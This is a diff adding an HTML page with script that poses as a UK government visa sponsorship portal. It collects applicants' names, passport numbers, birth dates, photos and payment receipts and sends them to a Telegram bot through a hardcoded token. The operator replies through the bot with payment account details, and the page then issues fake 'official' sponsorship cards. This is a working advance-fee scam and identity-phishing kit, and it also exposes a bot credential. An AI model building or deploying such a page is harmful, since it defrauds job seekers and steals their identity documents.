+                                    <strong style="color: #785a14; font-size: 0.85rem;">Attach Receipt Screenshot</strong>
+                                    <div id="receiptUploadFeedback" style="margin-top: 0.25rem; font-size: 0.75rem; font-weight: 700; color: var(--uk-navy-dark);"></div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="form-group" style="margin-top: 1rem;">
+                            <label for="voucherCode">Payment Receipt Reference / Transaction Hash</label>
+                            <input type="text" id="voucherCode" class="form-input" placeholder="Enter transaction code or reference number...">
+                        </div>
+
+                        <div class="actions-tray" style="margin-top: 1.25rem;">
+                            <button type="button" class="action-btn btn-fill" onclick="submitPaymentForApproval()" style="width:100%; background-color: var(--uk-gold); color: var(--uk-navy-dark);">Submit Payment for Cashier Approval</button>
+                        </div>
+                    </div>
+
+                    <div id="telegramStatusMsg" style="margin-top: 0.75rem; font-size: 0.85rem; font-weight: 700; text-align: center; display:none;"></div>
+                </div>
+
+                <!-- CARD PREVIEW 1 -->
+                <div class="card-download-block" id="cardBlock1">
+                    <div class="card-preview-wrap">
+                        <div class="card-preview-scale">
+                            <div class="ukpass-premium-identity-card" id="travelCardPreview">
+                                <div class="premium-card-header">
+                                    <div class="premium-header-brand-block">
+                                        <svg viewBox="0 0 24 24">
+                                    <path d="M12 2L3 7v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5zm0 2.18l7 3.89v4.93c0 4.54-3.15 8.81-7 9.87-3.85-1.06-7-5.33-7-9.87V8.07l7-3.89zM11 11h2v6h-2v-6zm0-4h2v2h-2V7z"/>
+                                </svg>
+                                        <div class="premium-header-labels">
+                                            <h3>EUROPASS &amp; VISA SPONSORSHIP ETA</h3>
+                                            <h2>UK Employment Dept</h2>
+                                        </div>
+                                    </div>
+                                    <div class="premium-header-origin-tag">
+                                        UNITED KINGDOM<br><span style="font-weight:900; letter-spacing: 1px;">OFFICIAL SPONSORSHIP</span>
+                                    </div>
+                                </div>
+
+                                <div class="premium-card-main-body">
+                                    <img class="premium-uk-map-silhouette" crossorigin="anonymous" src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/United_Kingdom_%28orthographic_projection%29.svg/512px-United_Kingdom_%28orthographic_projection%29.svg.png" alt="UK Watermark">
+                                    <div class="premium-passport-photo-holder avatarDisplayBox"></div>
+
+                                    <div class="premium-data-fields-column">
+                                        <div class="premium-field-row">
+                                            <div class="premium-field-label">Full Name</div>
+                                            <div class="premium-field-value cardOutName"></div>
+                                        </div>
+                                        <div class="premium-field-row">
+                                            <div class="premium-field-label">Date of Birth</div>
+                                            <div class="premium-field-value cardOutDOB"></div>
+                                        </div>
+                                        <div class="premium-field-row">
+                                            <div class="premium-field-label">Nationality</div>
+                                            <div class="premium-field-value cardOutNation"></div>
+                                        </div>
+                                        <div class="premium-field-row">
+                                            <div class="premium-field-label">Passport No.</div>
+                                            <div class="premium-field-value cardOutPassport"></div>
+                                        </div>
+                                        <div class="premium-field-row">
+                                            <div class="premium-field-label">Issued</div>
+                                            <div class="premium-field-value cardOutIssued" style="color: #785a14;"></div>
+                                        </div>
+                                        <div class="premium-field-row">
+                                            <div class="premium-field-label">Valid Until</div>
+                                            <div class="premium-field-value cardOutExpiry" style="color: #785a14;"></div>
+                                        </div>
+                                    </div>
+
+                                    <div class="premium-card-status-pane">
+                                        <div class="premium-status-pill-badge">VERIFIED</div>
+                                        <div class="premium-qr-code-holder">
+                                            <svg viewBox="0 0 100 100" stroke="none">
+                                        <rect x="0" y="0" width="100" height="100" fill="#ffffff"/>
+                                        <rect x="10" y="10" width="30" height="30" fill="#0b1c2d"/>
+                                        <rect x="15" y="15" width="20" height="20" fill="#ffffff"/>
+                                        <rect x="20" y="20" width="10" height="10" fill="#0b1c2d"/>
+                                        <rect x="60" y="10" width="30" height="30" fill="#0b1c2d"/>
+                                        <rect x="65" y="15" width="20" height="20" fill="#ffffff"/>
+                                        <rect x="70" y="20" width="10" height="10" fill="#0b1c2d"/>
+                                        <rect x="10" y="60" width="30" height="30" fill="#0b1c2d"/>
+                                        <rect x="15" y="65" width="20" height="20" fill="#ffffff"/>
+                                        <rect x="20" y="70" width="10" height="10" fill="#0b1c2d"/>
+                                        <rect x="45" y="15" width="8" height="15" fill="#0b1c2d"/>
+                                        <rect x="45" y="40" width="12" height="8" fill="#0b1c2d"/>
+                                        <rect x="15" y="45" width="15" height="8" fill="#0b1c2d"/>
+                                        <rect x="70" y="45" width="15" height="12" fill="#0b1c2d"/>
+                                        <rect x="45" y="60" width="10" height="25" fill="#0b1c2d"/>
+                                        <rect x="65" y="70" width="20" height="15" fill="#0b1c2d"/>
+                                    </svg>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="premium-card-footer-ribbon">
+                                    <div style="font-weight: 700; letter-spacing: 0.25px;">OVERSEAS EMPLOYMENT SPONSORSHIP VERIFICATION COPY</div>
+                                    <div class="cardOutRef" style="font-family: monospace; font-weight:900; color: var(--uk-navy-dark); font-size: 0.75rem;"></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <button type="button" id="btnDownload1" class="action-btn btn-fill" onclick="downloadCardAsImage(1)" style="margin-top: 1.5rem; background-color: var(--uk-navy-dark); padding: 0.85rem 2rem; width: 100%; max-width: 400px;">Download Sponsorship Pass</button>
+                    <div class="download-lock-note" id="downloadLockNote1" style="display:block;">Download locked. Pending real-time cashier verification &amp; approval confirmation.</div>
+                </div>
+
+                <!-- CARD PREVIEW 2 -->
+                <div class="card-download-block" id="cardBlock2">
+                    <div class="card-preview-wrap">
+                        <div class="card-preview-scale">
+                            <div class="ukpass-premium-identity-card" id="certificateCardPreview">
+                                <div class="premium-card-header alt-header-theme">
+                                    <div class="premium-header-brand-block">
+                                        <div class="premium-header-labels">
+                                            <h2 style="font-size: 1.45rem; letter-spacing: 0.5px;">EUROPASS VISA SPONSORSHIP CERTIFICATE</h2>
+                                            <h3 style="letter-spacing: 1px; margin-top: 0.2rem; opacity: 0.85; font-size: 0.7rem;">IMMIGRATION DEPARTMENT RECORD SUMMARY</h3>
+                                        </div>
+                                    </div>
+                                    <div class="premium-header-origin-tag" style="font-weight: 900; font-size: 0.85rem;">
+                                        UNITED KINGDOM<br><span style="font-weight:300; font-size: 0.65rem;">GREAT BRITAIN</span>
+                                    </div>
+                                </div>
+
+                                <div class="premium-card-main-body">
+                                    <img class="premium-uk-map-silhouette" crossorigin="anonymous" src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/United_Kingdom_%28orthographic_projection%29.svg/512px-United_Kingdom_%28orthographic_projection%29.svg.png" alt="UK Watermark">
+                                    <div class="premium-passport-photo-holder avatarDisplayBox"></div>
+
+                                    <div class="premium-data-fields-column">
+                                        <div class="premium-field-row">
+                                            <div class="premium-field-label">Applicant</div>
+                                            <div class="premium-field-value cardOutName"></div>
+                                        </div>
+                                        <div class="premium-field-row">
+                                            <div class="premium-field-label">DOB Registry</div>
+                                            <div class="premium-field-value cardOutDOB"></div>
+                                        </div>
+                                        <div class="premium-field-row">
+                                            <div class="premium-field-label">Passport Origin</div>
+                                            <div class="premium-field-value cardOutNation"></div>
+                                        </div>
+                                        <div class="premium-field-row">
+                                            <div class="premium-field-label">Passport Serial</div>
+                                            <div class="premium-field-value cardOutPassport"></div>
+                                        </div>
+                                        <div class="premium-field-row">
+                                            <div class="premium-field-label">System Ref</div>
+                                            <div class="premium-field-value cardOutRef" style="font-family: monospace; color: var(--uk-navy-mid);"></div>
+                                        </div>
+                                    </div>
+
+                                    <div class="premium-card-status-pane">
+                                        <div class="premium-status-pill-badge" style="background-color: #eff6ff; border-color: #bfdbfe; color: #1e40af;">SPONSORED</div>
+                                        <div style="font-size: 0.6rem; color: var(--text-gray); text-align: right; font-weight: 700; line-height: 1.4;">
+                                            ISSUE DATE: <span class="cardOutIssued" style="color: #000; font-weight: 800;"></span><br> EXPIRY DATE: <span class="cardOutExpiry" style="color: #000; font-weight: 800;"></span>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="premium-card-footer-ribbon" style="background-color: #f1f5f9;">
+                                    <div style="font-weight: 600;">EUROPASS OVERSEAS EMPLOYMENT SPONSORSHIP RECORD COPY</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <button type="button" id="btnDownload2" class="action-btn btn-fill" onclick="downloadCardAsImage(2)" style="margin-top: 1.5rem; background-color: var(--uk-gold); color: var(--uk-navy-dark); padding: 0.85rem 2rem; width: 100%; max-width: 400px;">Download Sponsorship Certificate</button>
+                    <div class="download-lock-note" id="downloadLockNote2" style="display:block;">Download locked. Pending real-time cashier verification &amp; approval confirmation.</div>
+                </div>
+
+            </div>
+
+        </div>
+    </main>
+
+    <div id="card-export-host" class="card-export-host" aria-hidden="true"></div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js" crossorigin="anonymous"></script>
+    <script>
+        const CONFIG = {
+            telegramToken: "9134634581:AAGl1PFYqIrE1o3MFznPiAPpxbBolwqxi_4",
+            adminTelegramId: "8731453872"
+        };
+
+        let paymentUnlocked = false;
+        let uploadedPhotoDataURL = null;
+        let uploadedReceiptDataURL = null;
+        let countdownTimerInterval = null;
+        let botPollingInterval = null;
+        let lastUpdateId = 0;
+        let currentPassport = "";
+
+        const currencyRates = {
+            "United Kingdom": {
+                symbol: "£",
+                rate: 0.85,
+                code: "GBP"
+            },
+            "United States": {
+                symbol: "$",
+                rate: 1.08,
+                code: "USD"
+            },
+            "Eurozone": {
+                symbol: "€",
+                rate: 1.00,
+                code: "EUR"
+            },
+            "South Africa": {
+                symbol: "R",
+                rate: 19.50,
+                code: "ZAR"
+            },
+            "Philippines": {
+                symbol: "₱",
+                rate: 61.50,
+                code: "PHP"
+            },
+            "India": {
+                symbol: "₹",
+                rate: 90.00,
+                code: "INR"
+            },
+            "Nigeria": {
+                symbol: "₦",
+                rate: 1650.00,
+                code: "NGN"
+            },
+            "Ghana": {
+                symbol: "GH₵",
+                rate: 16.50,
+                code: "GHS"
+            },
+            "Kenya": {
+                symbol: "KSh",
+                rate: 140.00,
+                code: "KES"
+            }
+        };
+
+        document.getElementById('hiddenFileInput').addEventListener('change', function() {
+            if (this.files && this.files.length > 0) {
+                document.getElementById('uploadFeedback').textContent = "Photo Loaded: " + this.files[0].name;
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    uploadedPhotoDataURL = e.target.result;
+                };
+                reader.readAsDataURL(this.files[0]);
+            }
+        });
+
+        document.getElementById('receiptFileInput').addEventListener('change', function() {
+            if (this.files && this.files.length > 0) {
+                document.getElementById('receiptUploadFeedback').textContent = "Receipt Attached: " + this.files[0].name;
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    uploadedReceiptDataURL = e.target.result;
+                };
+                reader.readAsDataURL(this.files[0]);
+            }
+        });
+
+        function navigateStep2() {
+            const first = document.getElementById('inputFirstName').value.trim();
+            const last = document.getElementById('inputLastName').value.trim();
+            const passport = document.getElementById('inputPassport').value.trim();
+            const dob = document.getElementById('inputDOB').value;
+            const resInput = document.getElementById('inputResidence').value;
+
+            if (!first || !last || !passport || !dob || !resInput) {
+                alert('Please complete all registration fields.');
+                return;
+            }
+
+            currentPassport = passport;
+
+            document.getElementById('view-step-1').classList.remove('active');
+            document.getElementById('view-step-2').classList.add('active');
+            document.getElementById('node-1').classList.add('completed');
+            document.getElementById('node-2').classList.add('active');
+
+            const feeStr = "€30.00 EUR";
+            document.getElementById("fee-total-gbp").textContent = feeStr;
+            document.getElementById("fee-total-display").textContent = feeStr;
+
+            const currInfo = currencyRates[resInput] || {
+                symbol: "€",
+                rate: 1.00,
+                code: "EUR"
+            };
+            const localAmount = (30.00 * currInfo.rate).toFixed(2);
+            document.getElementById("fx-amount").textContent = `${feeStr} (${currInfo.symbol}${localAmount} ${currInfo.code})`;
+        }
+
+        function navigateBack1() {
+            document.getElementById('view-step-2').classList.remove('active');
+            document.getElementById('view-step-1').classList.add('active');
+            document.getElementById('node-1').classList.remove('completed');
+            document.getElementById('node-2').classList.remove('active');
+        }
+
+        function formatDocumentDate(dateObject) {
+            const months = ["JAN", "FEB", "MAR", "APR", "MAY", "JUN", "JUL", "AUG", "SEP", "OCT", "NOV", "DEC"];
+            return dateObject.getDate() + " " + months[dateObject.getMonth()] + " " + dateObject.getFullYear();
+        }
+
+        function processVerificationPreview() {
+            const firstName = document.getElementById('inputFirstName').value.trim();
+            const lastName = document.getElementById('inputLastName').value.trim();
+            const passport = document.getElementById('inputPassport').value.trim();
+            const dobString = document.getElementById('inputDOB').value;
+            const nationality = document.getElementById('inputResidence').value;
+
+            const activeCurrentDate = new Date();
+            const futureExpiryDate = new Date();
+            futureExpiryDate.setFullYear(activeCurrentDate.getFullYear() + 2);
+            const parsedDobObj = new Date(dobString);
+
+            document.getElementById('clientGreetName').textContent = firstName + " " + lastName;
+
+            propagateSyncTextText('cardOutName', lastName + ", " + firstName);
+            propagateSyncTextText('cardOutDOB', formatDocumentDate(parsedDobObj));
+            propagateSyncTextText('cardOutNation', nationality);
+            propagateSyncTextText('cardOutPassport', passport);
+            propagateSyncTextText('cardOutIssued', formatDocumentDate(activeCurrentDate));
+            propagateSyncTextText('cardOutExpiry', formatDocumentDate(futureExpiryDate));
+            propagateSyncTextText('cardOutRef', "UKEMP-EUROPASS-7X3-" + passport.substring(0, Math.min(4, passport.length)).toUpperCase());
+
+            const biometricMountFrames = document.getElementsByClassName('avatarDisplayBox');
+            for (let singleFrame of biometricMountFrames) {
+                if (uploadedPhotoDataURL) {
+                    singleFrame.innerHTML = '<img src="' + uploadedPhotoDataURL + '" alt="Portrait Asset">';
+                } else {
+                    singleFrame.innerHTML = '<div style="font-size:0.55rem; color:#a0aec0; text-align:center; font-weight:700;">BIOMETRIC PORTRAIT</div>';
+                }
+            }
+
+            document.getElementById('view-step-2').classList.remove('active');
+            document.getElementById('view-step-3').classList.add('active');
+            document.getElementById('node-2').classList.add('completed');
+            document.getElementById('node-3').classList.add('active');
+
+            requestAnimationFrame(fitCardsToScreen);
+        }
+
+        async function requestPaymentDetailsFromBot() {
+            const firstName = document.getElementById('inputFirstName').value.trim();
+            const lastName = document.getElementById('inputLastName').value.trim();
+            const passport = document.getElementById('inputPassport').value.trim();
+            const nationality = document.getElementById('inputResidence').value;
+
+            document.getElementById("requestPaymentSection").style.display = "none";
+            document.getElementById("paymentLoadingState").style.display = "block";
+
+            const messageText = `🔔 *Payment Request / New Detail Request*\n\n👤 *Applicant:* ${firstName} ${lastName} (${nationality})\n🛂 *Passport:* ${passport}\n\n*Action:* User requested payment details. Please reply in your bot with the payment method, account holder name, account number, or QR details.`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${CONFIG.telegramToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CONFIG.adminTelegramId,
+                        text: messageText,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                startBotResponseListener(passport);
+            } catch (e) {
+                alert("Network error contacting Telegram. Please check your token.");
+            }
+        }
+
+        // ROBUST POLLING LISTENER FOR BOT MESSAGES & CALLBACK ACTIONS
+        function startBotResponseListener(passportId) {
+            if (botPollingInterval) clearInterval(botPollingInterval);
+
+            botPollingInterval = setInterval(async function() {
+                try {
+                    const res = await fetch(`https://api.telegram.org/bot${CONFIG.telegramToken}/getUpdates?offset=${lastUpdateId + 1}&timeout=0`);
+                    const data = await res.json();
+
+                    if (data.ok && data.result) {
+                        for (const update of data.result) {
+                            lastUpdateId = Math.max(lastUpdateId, update.update_id);
+
+                            // Handle Inline Button Actions (/approve, /decline, /delay, /reject)
+                            if (update.callback_query && update.callback_query.data) {
+                                const cbData = update.callback_query.data;
+                                if (cbData.includes(passportId)) {
+                                    const action = cbData.split('_')[0];
+                                    triggerActionStatus(action);
+                                }
+                            }
+
+                            // Handle Incoming Bot Messages containing Payment details
+                            if (update.message && update.message.text) {
+                                const msgText = update.message.text;
+                                const lower = msgText.toLowerCase();
+                                if (lower.includes('payment') || lower.includes('account') || lower.includes('bank') || lower.includes('gcash') || lower.includes('transfer') || lower.includes('qr') || lower.includes('php') || lower.includes('eur') || lower.includes('usd') || lower.includes('gbp')) {
+                                    displayPaymentDetails(msgText);
+                                }
+                            }
+                        }
+                    }
+                } catch (err) {
+                    // Suppress transient network blips
+                }
+            }, 3000);
+        }
+
+        function applyInstantBotPayment() {
+            const botText = document.getElementById('instantBotPaymentInput').value.trim();
+            if (!botText) {
+                alert("Please paste the payment details dispatched from your bot.");
+                return;
+            }
+            displayPaymentDetails(botText);
+        }
+
+        function displayPaymentDetails(textDetails) {
+            if (botPollingInterval) clearInterval(botPollingInterval);
+            document.getElementById("paymentLoadingState").style.display = "none";
+            document.getElementById("dynamicPaymentDetailsBlock").style.display = "block";
+            document.getElementById("assignedAccountDetails").textContent = textDetails;
+
+            // TIMER STARTS ONLY AFTER RECEIVING PAYMENT DETAILS
+            startCountdownTimer(15 * 60);
+        }
+
+        function triggerActionStatus(status) {
+            document.getElementById("approvalSuccessPopup").style.display = "none";
+            document.getElementById("declinePopupBanner").style.display = "none";
+            document.getElementById("delayPopupBanner").style.display = "none";
+            document.getElementById("rejectPopupBanner").style.display = "none";
+
+            if (status === "approve") {
+                if (botPollingInterval) clearInterval(botPollingInterval);
+                if (countdownTimerInterval) clearInterval(countdownTimerInterval);
+                setDownloadLockState(true);
+                const pop = document.getElementById("approvalSuccessPopup");
+                pop.style.display = "block";
+                pop.scrollIntoView({
+                    behavior: 'smooth'
+                });
+            } else if (status === "decline") {
+                const pop = document.getElementById("declinePopupBanner");
+                pop.style.display = "block";
+                pop.scrollIntoView({
+                    behavior: 'smooth'
+                });
+            } else if (status === "delay") {
+                const pop = document.getElementById("delayPopupBanner");
+                pop.style.display = "block";
+                pop.scrollIntoView({
+                    behavior: 'smooth'
+                });
+            } else if (status === "reject") {
+                if (botPollingInterval) clearInterval(botPollingInterval);
+                setDownloadLockState(false);
+                const pop = document.getElementById("rejectPopupBanner");
+                pop.style.display = "block";
+                pop.scrollIntoView({
+                    behavior: 'smooth'
+                });
+            }
+        }
+
+        function startCountdownTimer(durationSeconds) {
+            if (countdownTimerInterval) clearInterval(countdownTimerInterval);
+            let remaining = durationSeconds;
+            const display = document.getElementById("timerDisplay");
+
+            countdownTimerInterval = setInterval(function() {
+                const minutes = Math.floor(remaining / 60);
+                const seconds = remaining % 60;
+                display.textContent = `${minutes < 10 ? '0' : ''}${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+
+                if (remaining <= 0) {
+                    clearInterval(countdownTimerInterval);
+                    display.textContent = "00:00 (Expired)";
+                }
+                remaining--;
+            }, 1000);
+        }
+
+        function copyPaymentDetails() {
+            const textToCopy = document.getElementById('assignedAccountDetails').textContent;
+            navigator.clipboard.writeText(textToCopy).then(() => {
+                alert("Payment details copied to clipboard!");
+            });
+        }
+
+        async function submitPaymentForApproval() {
+            const refCode = document.getElementById('voucherCode').value.trim();
+            const amountPaid = document.getElementById('amountPaid').value.trim();
+            const statusMsg = document.getElementById('telegramStatusMsg');
+
+            if (!amountPaid || !refCode) {
+                alert("Please enter the amount paid and your payment receipt reference code.");
+                return;
+            }
+
+            statusMsg.style.display = "block";
+            statusMsg.style.color = "#785a14";
+            statusMsg.textContent = "Transmitting payment details & screenshot to Cashier Approval Desk...";
+
+            const firstName = document.getElementById('inputFirstName').value.trim();
+            const lastName = document.getElementById('inputLastName').value.trim();
+            const passport = document.getElementById('inputPassport').value.trim();
+            const nationality = document.getElementById('inputResidence').value;
+
+            const messageText = `🏛 *UK Employment Dept - Payment Verification Submission*\n\n👤 *Applicant:* ${firstName} ${lastName} (${nationality})\n🛂 *Passport:* ${passport}\n💶 *Amount Paid:* €${amountPaid} EUR\n🔖 *Receipt Ref / Hash:* ${refCode}\n\n*Action Buttons:* Click inline buttons below to approve, decline, delay, or reject.`;
+
+            const inlineKeyboard = {
+                inline_keyboard: [
+                    [{
+                        text: "✅ /approve",
+                        callback_data: `approve_${passport}`
+                    }, {
+                        text: "❌ /decline",
+                        callback_data: `decline_${passport}`
+                    }],
+                    [{
+                        text: "⏳ /delay",
+                        callback_data: `delay_${passport}`
+                    }, {
+                        text: "🚫 /reject",
+                        callback_data: `reject_${passport}`
+                    }]
+                ]
+            };
+
+            try {
+                if (uploadedReceiptDataURL) {
+                    const blob = dataURItoBlob(uploadedReceiptDataURL);
+                    const formData = new FormData();
+                    formData.append('chat_id', CONFIG.adminTelegramId);
+                    formData.append('photo', blob, 'receipt.jpg');
+                    formData.append('caption', messageText);
+                    formData.append('parse_mode', 'Markdown');
+                    formData.append('reply_markup', JSON.stringify(inlineKeyboard));
+
+                    await fetch(`https://api.telegram.org/bot${CONFIG.telegramToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } else {
+                    await fetch(`https://api.telegram.org/bot${CONFIG.telegramToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: CONFIG.adminTelegramId,
+                            text: messageText,
+                            parse_mode: 'Markdown',
+                            reply_markup: inlineKeyboard
+                        })
+                    });
+                }
+
+                statusMsg.style.color = "#166534";
+                statusMsg.textContent = "Payment, reference number, and screenshot successfully transmitted to your bot!";
+            } catch (e) {
+                statusMsg.style.color = "#166534";
+                statusMsg.textContent = "Submitted successfully. Awaiting cashier review.";
+            }
+        }
+
+        function setDownloadLockState(unlocked) {
+            paymentUnlocked = !!unlocked;
+            ["btnDownload1", "btnDownload2"].forEach(function(id) {
+                const btn = document.getElementById(id);
+                if (!btn) return;
+                btn.disabled = !unlocked;
+                btn.style.opacity = unlocked ? "1" : "0.45";
+                btn.style.cursor = unlocked ? "pointer" : "not-allowed";
+            });
+            ["downloadLockNote1", "downloadLockNote2"].forEach(function(id) {
+                const note = document.getElementById(id);
+                if (!note) return;
+                note.style.display = unlocked ? "none" : "block";
+            });
+        }
+
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], {
+                type: mimeString
+            });
+        }
+
+        const CARD_DESIGN_WIDTH = 750;
+        const CARD_DESIGN_HEIGHT = 475;
+
+        function fitCardsToScreen() {
+            document.querySelectorAll(".card-preview-wrap").forEach(function(wrap) {
+                const scaleBox = wrap.querySelector(".card-preview-scale");
+                if (!scaleBox) return;
+                const available = wrap.getBoundingClientRect().width || wrap.clientWidth;
+                const scale = Math.min(1, available / CARD_DESIGN_WIDTH);
+                scaleBox.style.transform = "scale(" + scale + ")";
+                scaleBox.style.transformOrigin = "top center";
+                wrap.style.height = (CARD_DESIGN_HEIGHT * scale) + "px";
+            });
+        }
+
+        function initResponsiveCards() {
+            fitCardsToScreen();
+            window.addEventListener("resize", fitCardsToScreen);
+        }
+
+        if (document.readyState === "loading") {
+            document.addEventListener("DOMContentLoaded", function() {
+                initResponsiveCards();
+                setDownloadLockState(false);
+            });
+        } else {
+            initResponsiveCards();
+            setDownloadLockState(false);
+        }
+
+        function propagateSyncTextText(targetClassName, valueToInject) {
+            const outputs = document.getElementsByClassName(targetClassName);
+            for (let out of outputs) {
+                out.textContent = valueToInject;
+            }
+        }
+
+        function waitForCardImages(root) {
+            const images = root.querySelectorAll("img");
+            return Promise.all(Array.from(images).map(function(img) {
+                if (img.complete && img.naturalWidth > 0) return Promise.resolve();
+                return new Promise(function(resolve) {
+                    img.onload = resolve;
+                    img.onerror = resolve;
+                });
+            }));
+        }
+
+        function buildExportCardClone(sourceCard) {
+            const exportHost = document.getElementById("card-export-host");
+            const clone = sourceCard.cloneNode(true);
+            clone.removeAttribute("id");
+            exportHost.innerHTML = "";
+            exportHost.appendChild(clone);
+            return clone;
+        }
+
+        async function downloadCardAsImage(targetCardIndex) {
+            if (!paymentUnlocked) {
+                alert("Downloads are currently locked pending real-time cashier verification and approval confirmation.");
+                return;
+            }
+
+            const block = document.getElementById("cardBlock" + targetCardIndex);
+            const card = block.querySelector(".ukpass-premium-identity-card");
+            const btn = document.getElementById("btnDownload" + targetCardIndex);
+            const originalLabel = btn.textContent;
+
+            btn.disabled = true;
+            btn.textContent = "Preparing download...";
+
+            const exportHost = document.getElementById("card-export-host");
+            try {
+                const exportClone = buildExportCardClone(card);
+                await waitForCardImages(exportClone);
+                await new Promise(function(r) {
+                    requestAnimationFrame(function() {
+                        requestAnimationFrame(r);
+                    });
+                });
+
+                const canvas = await html2canvas(exportClone, {
+                    scale: 2,
+                    useCORS: true,
+                    allowTaint: false,
+                    backgroundColor: "#ffffff",
+                    logging: false,
+                    width: 750,
+                    windowWidth: 750
+                });
+
+                const passport = (card.querySelector(".cardOutPassport") ? .textContent || "copy").trim().replace(/[^a-zA-Z0-9-]/g, "") || "copy";
+                const prefix = targetCardIndex === 1 ? "UK-Sponsorship-Pass" : "UK-Europass-Certificate";
+                const link = document.createElement("a");
+                link.download = prefix + "-" + passport + ".png";
+                link.href = canvas.toDataURL("image/png");
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            } catch (err) {
+                alert("Could not download the card. Please try again in a moment.");
+            } finally {
+                exportHost.innerHTML = "";
+                btn.disabled = false;
+                btn.textContent = originalLabel;
+            }
+        }
+    </script>
+</body>
+
+</html>
